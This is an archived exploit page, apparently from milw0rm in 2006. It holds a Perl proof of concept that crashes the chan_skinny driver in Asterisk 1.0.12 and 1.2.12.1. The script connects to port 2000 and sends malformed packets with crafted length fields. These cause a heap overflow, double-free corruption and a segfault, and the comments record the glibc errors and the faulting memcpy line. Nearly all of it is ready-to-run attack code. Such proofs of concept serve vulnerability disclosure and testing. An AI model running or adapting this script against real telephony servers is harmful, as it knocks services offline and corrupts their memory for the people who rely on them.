<html><head><title>Asterisk <= 1.0.12 / 1.2.12.1 (chan_skinny) Remote Heap Overflow (PoC)</title></head><pre>#!/usr/bin/perl
# Beyond Security
# Copyright Noam Rathaus &lt;noamr@beyondsecurity.com&gt;

#
# The following proof of concept causes the chan_skippy to crash in different locations and due to
# memory corruption as well as double free calls, this is based on the finding of
# Security-Assessment.com, and proves that the vulnerability is indeed exploitable and there...
#

use IO::Socket;
use strict;

my $target = &quot;127.0.0.1&quot;;

my $remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; &quot;2000&quot;);

unless ($remote) { die &quot;cannot connect to skinny daemon on $target&quot; }

my $packet = &quot;A&quot;x1000; #Causes *** glibc detected *** malloc(): memory corruption: 0x08175830 ***
my $packet = &quot;\x30\xE0\x00\x00&quot;.&quot;\x00\x00\x00\x00&quot;.(&quot;A&quot;x1000); # *** glibc detected *** double free or corruption (!prev): 0x08184348 ***
my $packet = &quot;\xE5\x03\x00\x00&quot;.(&quot;A&quot;x996); # *** glibc detected *** double free or corruption (out): 0x08171740 ***
my $packet = &quot;\xF0\xFF\xFF\xFF&quot;.(&quot;A&quot;x996); # Program received signal SIGSEGV, Segmentation fault.
#[Switching to Thread -1494127696 (LWP 9909)]
#0xa76264cb in skinny_session (data=0x8183ee8) at chan_skinny.c:2896
#2896 memcpy(req, s-&gt;inbuf, letohl(*(int*)(s-&gt;inbuf))+8);

print $remote $packet;

# milw0rm.com [2006-10-19]</pre></html>